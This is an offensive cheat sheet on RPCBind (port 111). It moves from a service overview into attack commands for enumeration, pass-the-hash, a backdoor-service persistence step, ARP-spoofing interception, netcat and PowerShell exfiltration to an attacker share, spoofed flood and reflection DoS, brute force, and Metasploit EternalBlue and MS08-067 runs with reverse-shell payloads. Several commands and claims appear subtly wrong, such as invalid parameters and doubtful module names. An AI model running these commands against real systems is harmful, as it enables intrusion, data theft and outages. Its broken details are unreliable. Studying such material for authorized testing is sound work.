# Index
- [[Ports, Protocols, and Services]]
	- [[P135 RPC Microsoft Endpoint Mapper]]
	- [[P593 RPC HTTP Endpoint Mapper]]
	- [[P445 SMB]]

# RPCBind

- **Port Number:** 111
- **Protocol:** TCP/UDP
- **Service Name:** RPCBind
- **Defined in:** RFC 1833

RPCBind is a service that maps Remote Procedure Call (RPC) program numbers to network addresses. This is crucial for clients to locate the network services that they need to communicate with. RPCBind is typically used in environments where distributed computing is necessary, like NFS (Network File System). When an RPC service starts, it registers its address with RPCBind under a specific program number. Clients then contact RPCBind to retrieve the address of the service they wish to interact with.

## Overview of Features

- **Portmapper Functionality:** RPCBind acts as a portmapper, mapping RPC program numbers to the port numbers on which the services are listening.
  
- **TCP/UDP Support:** Operates over both TCP and UDP, providing flexibility depending on the network’s reliability and performance needs.

- **Centralized Service Discovery:** Allows for centralized management of RPC services, where clients can dynamically discover available services without hardcoding addresses.

- **Backward Compatibility:** Supports backward compatibility with older versions of the Sun RPC service.

- **Security Considerations:** While integral to many distributed systems, RPCBind is often a target for attacks due to its critical role in service discovery.

## Typical Use Cases

- **NFS (Network File System):** RPCBind is commonly used in NFS to help clients locate file-sharing services.
  
- **Distributed Applications:** Used in environments where distributed applications require access to various network services dynamically.

- **Service Registration and Discovery:** Essential in systems where services need to register their presence and clients need to locate these services efficiently.

- **Legacy Systems:** Often found in older Unix-like systems and environments where older RPC-based services are still in use.

## How RPCBind Works

1. **Service Registration:**
   - **Step 1:** When an RPC service starts, it registers its program number and the port it is listening on with the RPCBind service running on the local machine.
   - **Step 2:** The RPCBind service stores this information in its internal tables.

2. **Client Request:**
   - **Step 3:** A client needing to use an RPC service sends a request to the RPCBind service on the server, specifying the program number it wishes to connect to.
   - **Step 4:** The RPCBind service checks its tables for the requested program number.

3. **Service Lookup:**
   - **Step 5:** If the program number is found, RPCBind returns the corresponding port number to the client.
   - **Step 6:** The client then uses this port number to communicate directly with the RPC service.

4. **Dynamic Port Allocation:**
   - **Step 7:** RPC services typically use dynamically allocated ports, which are registered with RPCBind. This allows for flexibility in service management.

5. **Service Deregistration:**
   - **Step 8:** When an RPC service stops, it deregisters itself from RPCBind, removing its entry from the internal tables.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` queries RPCBind on `<target_ip>:111` for the port of an NFS service.
- **Server:** `<target_ip>` responds with the port number where the NFS service is listening.
- **Client:** `<attack_ip>` connects to the NFS service on the provided port.

# Additional Information

## Security Considerations
- **Exposure to Attacks:** Due to its role in service discovery, RPCBind is often exposed to the public internet, making it a common target for reconnaissance and exploitation.
  
- **Abuse in DDoS Attacks:** RPCBind can be leveraged in Distributed Denial of Service (DDoS) attacks, particularly reflection attacks, due to its ability to generate large amounts of network traffic in response to small requests.

- **Obsolete in Some Contexts:** In modern architectures, RPCBind is often replaced by more secure and robust service discovery mechanisms, such as those provided by service meshes or DNS-based discovery.

## Alternatives
- **Service Meshes:** Tools like Istio or Linkerd provide service discovery, load balancing, and security features that can replace traditional RPCBind in modern cloud-native environments.
  
- **Consul and DNS-Based Discovery:** HashiCorp's Consul and other DNS-based service discovery tools are often preferred in microservices environments where dynamic service discovery is essential.

## Advanced Usage
- **Centralized RPC Management:** RPCBind can be configured to manage RPC services across multiple servers, providing a central point of service registration and discovery.

## Modes of Operation
- **Standalone Mode:** RPCBind operates independently, managing RPC services on a single host.
  
- **Clustered Mode:** In environments with multiple servers, RPCBind can operate in a clustered fashion, sharing service information across nodes.

## Configuration Files

Configuration for RPCBind is generally minimal, but the following files may be relevant depending on the system setup:

1. **Main Configuration File:**
  - **Location:** `/etc/rpcbind.conf` (if exists, varies by system)
  - **Purpose:** Defines configuration options for the RPCBind service, such as logging and security settings.
  - **Example Configuration:**
  ```bash
  # Enable verbose logging
  OPTIONS="-v"
  
  # Restrict to localhost for security
  RPCBIND_ARGS="-h 127.0.0.1"
  ```
  - **Key Settings:**
    - `-w`: Allows connections from non-privileged ports, useful in certain environments but potentially a security risk.
    - `-h <hostname>`: Binds RPCBind to a specific IP address or hostname, limiting its exposure to other network segments.

## Potential Misconfigurations

1. **Exposing RPCBind to the Internet:**
   - **Risk:** Allowing RPCBind to be accessible from the internet can expose the network to various attacks, including enumeration, reflection, and amplification attacks.
   - **Exploitation:** Attackers can query the RPCBind service to discover available RPC services and potentially exploit them.

2. **Weak Firewall Rules:**
   - **Risk:** Inadequate firewall rules may allow unauthorized access to RPCBind, leading to potential abuse.
   - **Exploitation:** Attackers may bypass security measures and interact directly with the RPCBind service to gather information or conduct attacks.

3. **Lack of Logging:**
   - **Risk:** Not enabling verbose logging for RPCBind can hinder the detection and analysis of suspicious activities.
   - **Exploitation:** Attackers could exploit the service without triggering any alerts, making it difficult to detect the breach.

4. **Improper Access Controls:**
   - **Risk:** Failure to restrict access to RPCBind could allow unauthorized users to register or deregister services.
   - **Exploitation:** Malicious users could disrupt service availability by manipulating the RPCBind tables.

## Default Credentials

RPCBind does not use authentication mechanisms, and therefore, there are no default credentials associated with it. However, access control is typically managed through network-level security measures like firewalls.

# Interaction and Tools

## Tools

### [[RPCInfo]]
- **Enumerate RPC Service:** Enumerate RPC services registered with RPCBind, which is crucial for understanding the attack surface.
    ```bash
    rpcinfo -p <target_ip>
    ```
- **Checking Specific Service:** Checks if a specific RPC service, identified by its program number, is available over TCP.
    ```bash
    rpcinfo -t <target_ip> <program_number>
    ```
- **Removing a Service:** Deregisters a specific service from RPCBind.
    ```bash
    rpcbind -d <program_number>
    ```
- **Monitoring RPCBind Activity:** Starts RPCBind with verbose logging to monitor all activities, useful for debugging or security audits.
    ```bash
    rpcbind -v
    ```
- **Restricting Access:** Binds RPCBind to a specific IP address, restricting its accessibility to a particular network interface.
    ```bash
    rpcbind -h <ip_address>
    ```

### [[RPCClient]]
- **Connect via username/password:**
	```bash
	rpcclient --user <username> --password '<password>' --workgroup <target_domain> //<target_ip>
	```

	```bash
	rpcclient -U <username>%<password> -W <target_omain> //<target_ip>
	```
- **Connect via password hash:**
	```bash
	rpcclient --user <username> --pw-nt-hash --workgroup <target_domain> //<target_ip>
	```
- **Connect via no password:**
	```bash
	rpcclient --user <username> --workgroup <target_domain> --no-pass //<target_ip>
	```
- **Connect via null session:**
	```bash
	rpcclient -N //<target_ip>
	```
- **Execute shell commands:**
	```bash
	rpcclient --user <username> --password '<password>' --workgroup <target_domain> --command <semicolon_separated_commands> //<target_ip>
	```

	```bash
	rpcclient -U alice%password -c "srvinfo" //192.168.1.100
	```
- **User enumeration:**
	```bash
	List users: querydispinfo and enumdomusers
	Get user details: queryuser <0xrid>
	Get user groups: queryusergroups <0xrid>
	GET SID of a user: lookupnames <username>
	Get users aliases: queryuseraliases [builtin|domain] <sid>
	```
- **Group enumeration:**
	```bash
	List groups: enumdomgroups
	Get group details: querygroup <0xrid>
	Get group members: querygroupmem <0xrid>
	```
- **Aliasgroup enumeration:**
	```bash
	List alias: enumalsgroups <builtin|domain>
	Get members: queryaliasmem builtin|domain <0xrid>
	```
- **Domain enumeration:**
	```bash
	List domains: enumdomains
	Get SID: lsaquery
	Domain info: querydominfo
	```
- **Share enumeration:**
	```bash
	Enumerate all available shares: netshareenumall
	Info about a share: netsharegetinfo <share>
	```
- **More SIDs:**
	```bash
	Find SIDs by name: lookupnames <username>
	Find more SIDs: lsaenumsid
	RID cycling (check more SIDs): lookupsids <sid>
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 111"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 111
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 111
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 111 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 111
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 111 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple test to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:111
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 111 -c 1
    ```

### [[Enum4Linux]]
- **Enumerate via username/password:** Enumerating information from Windows and Samba systems.
	```bash
	./enum4linux-ng.py -A -u <username> -p <password> -d <domain_controller_ip> <target_ip>
	```

### [[NetExec]]
### [[CrackMapExec]]
- **Connect via username/password:**
	```bash
	crackmapexec smb <target_ip> -u <username> -p <password>
	```
- **Enumerate RPC:** Enumerate RPC services with authentication, useful for understanding the services available on a network.
    ```bash
    crackmapexec smb <target_ip> -u <username> -p <password> --rpc-enum
    ```

### [[Impacket]]

#### [[Impacket-RPCMap]]
- **Enumerate RPC:** Extracts a list of RPC services and their associated UUIDs, providing detailed information about the services running on the target.
	```bash
	impacket-rpcdump @<target_ip>
	```

### [[Custom Scripts]]
- **Description:** Scripts written in Python, Perl, or Bash can be used to interact with RPCBind for enumeration or exploitation.
- **Example Code (Python):**
    ```python
    import subprocess
    result = subprocess.run(["rpcinfo", "-p", "<target_ip>"], capture_output=True, text=True)
    print(result.stdout)
    ```
- **Use Case:** Automate the enumeration of RPC services using RPCBind.

## Other Techniques

### Mount RPC Share Locally
- **Mount RPC Share Locally:**
	```bash
	sudo mount -t nfs <target_ip>:/remote/path /local/mount
	sudo rpc.mountd -o <options> <target_ip>:<share_name> /local/mount/point
	```

### GUI Connection from Linux
- **GUI Connection from Linux:**
	```bash
	xdg-open rpc://<target_ip>/
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 111
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 111
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

<br>

- **Tool:** [[RPCInfo]], [[Impacket-RPCDump]]
    ```bash
    impacket-rpcdump @<target_ip>
    ```
- **Description:** Enumerates the RPC services running on the target system, providing valuable information for subsequent attacks.

### Network Mapping
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_subnet>/24 -sV --script=rpc-grind 
    ```
- **Description:** Maps out all devices on a network that are running RPC services, identifying potential targets for exploitation.

### Exploiting Open Port 111
- **Tool:** [[Metasploit]]
    ```bash
    use auxiliary/scanner/dcerpc/endpoint_mapper
    set RHOSTS <target_ip>
    run
    ```
- **Description:** Use Metasploit to enumerate and identify vulnerable RPC services that can be exploited for initial access.

## Initial Access

### Pass-the-Hash via RPC
- **Tool:** [[Mimikatz Cheat Sheet]], [[CrackMapExec]]
    ```bash
    crackmapexec smb <target_ip> -u <username> -H <NTLM_hash> --rpc-enum
    ```
- **Description:** Use stolen NTLM hashes to authenticate to RPC services without needing the plaintext password.

## Persistence

### Service Hijacking
- **Tool:** [[Metasploit]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```bash
    New-Service -Name "HijackedRPC" -Binary "C:\backdoor.exe" -Port 111
    ```
- **Description:** Hijack an existing RPC service to establish persistence within the target environment.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[ettercap]], [[BetterCap Cheat Sheet]]
	```bash
	ettercap -Tq -i <interface> -M arp:remote /<target_ip>/ /<server_ip>/
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

## Privilege Escalation

### Abuse of Misconfigured RPC Services
- **Tool:** [[Metasploit]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```bash
    Get-Service | Where-Object { $_.DisplayName -like "*RPC*" }
    ```
- **Description:** Identify misconfigured or poorly secured RPC services that can be exploited for privilege escalation.

## Lateral Movement, Pivoting, and Tunnelling

### Pivoting Through RPC
- **Tool:** [[Impacket-RPCDump]]
    ```bash
    impacket-rpcdump /p <target_ip>
    ```
- **Description:** In a compromised environment, the Endpoint Mapper can be used to identify services that may allow for lateral movement. Identifies RPC services on internal machines, which can then be targeted for further exploitation.

### RPC Tunnelling
- **Tool:** [[SSH, [[NetCat]]
    ```bash
    ssh -L 111:<target_ip>:111 user@intermediate_host    
    ```
- **Description:** Set up a tunnel to access RPC services through an intermediate host, bypassing network restrictions.

### Lateral Movement via RPC
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Enter-PSSession -ComputerName <target_ip> -Credential (Get-Credential) -UseSSL
    ```
  - **Description:** Moves laterally within a network by establishing RPC over HTTP/S connections to other machines.
- Defense Evasion

### Obfuscating Traffic
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]], [[Custom Scripts]]
    ```powershell
    powershell -encodedCommand <encoded_command>
    ```
- **Description:** Obfuscate RPC-related traffic to evade detection by security monitoring tools.

### Hiding RPC Traffic
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]], [[Custom Scripts]]
    ```bash
    New-NetFirewallRule -DisplayName "Allow RPC" -Direction Outbound -Protocol TCP -LocalPort 111
    ```
- **Description:** Modify firewall rules to allow RPC traffic without triggering alarms, aiding in stealthy communication.

### Bypassing Firewalls
- **Tool:** [[RPCClient]]
     ```bash
    rpcclient <target_ip> -c 'epmapper'
    ```
- **Description:** If the Endpoint Mapper is accessible but certain RPC services are blocked by a firewall, it might be possible to discover the dynamic ports assigned to these services and attempt to connect directly. Enumerates RPC services and their dynamic ports, allowing you to attempt connections even if the standard RPC ports are blocked.

## Data Exfiltration

### Covert Data Exfiltration via RPC
- **Tool:** [[Custom Scripts]], [[4. Tool Guides/Incomplete/PowerShell]]
    ```powershell
    Invoke-Command -ComputerName <target_ip> -ScriptBlock { Get-Content C:\sensitive_data.txt | Out-File -FilePath "\\<attack_ip>\share\data.txt" }
    ```
- **Description:** Exfiltrates data by sending it over an RPC over HTTP connection, which may bypass traditional data loss prevention (DLP) measures.

### Covert Data Exfiltration via RPC
- **Tool:** [[Custom Scripts]], [[NetCat]]
    ```bash
    echo "secret_data" | nc <target_ip> 111
    
    nc <target_ip> 111 < secret_data.txt
    ```
- **Description:** Use RPC communications to covertly exfiltrate data from the target network.

### Exfiltration via Dynamic Ports
- **Tool:** [[Metasploit]], [[Scapy]]
    ```python
    send(IP(dst="<target_ip>")/TCP(dport=49152)/Raw(load="exfil_data"))
    ```
- **Description:** Leverage dynamically assigned RPC ports to exfiltrate data, making it harder to detect.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rpc://<target_ip> -s 111 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rpc://<target_ip> -s 111 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

## Exploits 

### MS17-010 (EternalBlue)
- **Tool:** [[Metasploit]], [[Custom Scripts]]
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in Microsoft's implementation of the SMB protocol that could allow remote code execution. This exploit was used in the WannaCry ransomware attack.

### MS08-067 (Conficker Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set PAYLOAD windows/meterpreter/reverse_tcp
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits a vulnerability in the Server service's handling of RPC requests, allowing for remote code execution.

### MS03-026 (Blaster Worm)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/smb/ms03_026_dcom
    set RHOST <target_ip>
    run
    ```
- **Description:** A critical vulnerability in the RPC interface that allowed remote code execution. Exploits a heap overflow in the RPCSS service to execute arbitrary code with SYSTEM privileges.

### Rpcbomb (CVE-2003-0681)
- **Tool:** [[Custom Scripts]], [[Metasploit]]
	```bash
	use exploit/unix/rpc/rpcbomb
	set RHOST <target_ip>
	run
	```
- **Description:** Exploit RPCBind to crash or execute arbitrary code on the target system.

### Microsoft Windows RPC DCOM Vulnerability (CVE-2003-0352)
- **Tool:** [[Custom Scripts]], [[Metasploit]]
- **Description:** A critical vulnerability in Microsoft Windows' RPC implementation, allowing remote code execution.

### Linux rpc.ugidd Buffer Overflow
- **Tool:** [[Custom Scripts]], [[Metasploit]]
- **Description:** A buffer overflow in the rpc.ugidd service that could allow arbitrary code execution.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 1833 (RPCBind)|https://tools.ietf.org/html/rfc1833|
|Nmap RPC Scan|https://nmap.org/book/rpc-scanning.html|
|Metasploit RPC Modules|https://www.rapid7.com/db/modules/|
|Wireshark RPC Analysis|https://www.wireshark.org/docs/wsug_html_chunked/ChapterDissectingRPC.html|
|Linux man-pages (rpcbind)|https://man7.org/linux/man-pages/man8/rpcbind.8.html|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|TCP/IP Illustrated|https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|NFS and RPC Security|https://www.sans.org/reading-room/whitepapers/linux/nfs-rpc-security-34605|
|Netcat Guide|https://nmap.org/ncat/guide/index.html|
